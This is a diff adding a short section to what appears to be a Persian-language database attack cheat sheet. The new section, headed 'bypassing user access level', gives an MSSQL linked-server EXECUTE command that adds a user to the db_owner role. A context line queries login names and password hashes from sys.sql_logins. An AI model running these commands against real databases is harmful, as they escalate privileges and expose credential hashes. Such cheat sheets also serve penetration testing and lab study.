@@ -82,6 +82,12 @@ name= 'mytable')
 SELECT name, password hash FROM master.sys.sgl_logins
 ```
 
+### دور زدن سطح دسترسی کاربر
+
+```text
+execute('execute(''alter role [db_owner] add member [client]'') at "compatibility\poo_public"')
+```
+
 ## Postgres
 
 | **دستور** | **توضیح** |
